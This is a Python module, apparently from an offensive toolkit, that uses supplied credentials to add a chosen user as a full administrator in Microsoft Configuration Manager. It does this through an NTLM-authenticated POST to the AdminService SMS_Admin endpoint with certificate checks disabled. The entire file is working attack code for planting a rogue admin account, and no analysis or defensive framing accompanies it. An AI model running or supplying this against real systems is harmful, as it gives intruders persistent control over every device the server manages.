import requests
from requests_ntlm import HttpNtlmAuth
from lib.logger import logger
from urllib3.exceptions import InsecureRequestWarning
import json


class ADD_ADMIN:
    def __init__(self, username, password, target_ip, logs_dir):
        self.username = username
        self.password = password
        self.target_ip = target_ip
        self.logs_dir = logs_dir


    def jprint(self, obj):
        text = json.dumps(obj, sort_keys=True, indent=4)
        logger.debug(text)


    def run(self, targetuser, targetsid):
        self.targetuser = targetuser
        self.targetsid = targetsid

        headers = {'Content-Type': 'application/json; odata=verbose'}
        requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
        
        body = {"LogonName": f"{self.targetuser}", 
            "AdminSid":f"{self.targetsid}",
            "Permissions":[{"CategoryID": "SMS00ALL", 
                            "CategoryTypeID": 29, 
                            "RoleID":"SMS0001R",
                            },
                            {"CategoryID": "SMS00001",
                            "CategoryTypeID": 1, 
                            "RoleID":"SMS0001R", 
                            },
                            {"CategoryID": "SMS00004", 
                            "CategoryTypeID": 1, 
                            "RoleID":"SMS0001R",
                            }],
            "DisplayName":f"{self.targetuser}"
            }
        #delete url
        #url = f"https://{self.target_ip}/AdminService/wmi/SMS_Admin(16777221)"

        #add url
        url = f"https://{self.target_ip}/AdminService/wmi/SMS_Admin/"

        try:
            r = requests.post(f"{url}",
                                auth=HttpNtlmAuth(self.username, self.password),
                                verify=False,headers=headers, json=body)
            if r.status_code == 201:
                logger.info(f"[+] Successfully added {self.targetuser} as an admin.")
                results = r.json()
                self.jprint(results)
            else:
                logger.info("[*] Something went wrong")
                logger.info(r.text)
        except Exception as e:
                print(e)